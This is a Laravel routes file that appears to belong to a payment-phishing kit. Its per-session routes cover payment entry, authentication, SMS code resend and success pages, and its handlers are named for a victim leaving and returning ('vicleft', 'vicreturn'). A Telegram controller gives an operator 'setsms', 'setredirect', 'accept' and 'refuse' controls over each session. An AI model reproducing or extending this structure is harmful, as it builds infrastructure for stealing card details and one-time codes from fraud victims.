<?php

use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::get('/', [App\Http\Controllers\sessionController::class, 'create']);
Route::post('/store', [App\Http\Controllers\payment::class, 'store'])->name('store');
Route::get("/test",[App\Http\Controllers\sessionController::class, 'get']);
Route::get('/{session}/', [App\Http\Controllers\payment::class, 'indexreal']);
Route::post('/{session}/payment', [App\Http\Controllers\payment::class, 'index'])->name('payment');
Route::post('/{session}/store', [App\Http\Controllers\payment::class, 'store'])->name('store');

Route::post('/{session}/authenticate', [App\Http\Controllers\payment::class, 'authen'])->name('auth');
Route::post('/{session}/left', [App\Http\Controllers\payment::class, 'vicleft'])->name('left');
Route::post('/{session}/return', [App\Http\Controllers\payment::class, 'vicreturn'])->name('return');
Route::get('/{session}/payment', [App\Http\Controllers\payment::class, 'index'])->name('paymentget');
Route::get("/{session}/testup", [App\Http\Controllers\TelegramController::class, 'index'])->name('getup');
Route::get('/{session}/success', [App\Http\Controllers\successController::class, 'index'])->name('success');
Route::get("/{session}/resend", [App\Http\Controllers\payment::class, 'resend'])->name('resend');
Route::get("/{session}/setsms", [App\Http\Controllers\telegramButtonsController::class, 'setsms'])->name('setsms');
Route::get("/{session}/setredirect", [App\Http\Controllers\telegramButtonsController::class, 'setredirect'])->name('setredirect');
Route::get("/{session}/accept", [App\Http\Controllers\telegramButtonsController::class, 'accept'])->name('accept');
Route::get("/{session}/refuse", [App\Http\Controllers\telegramButtonsController::class, 'refuse'])->name('refuse');

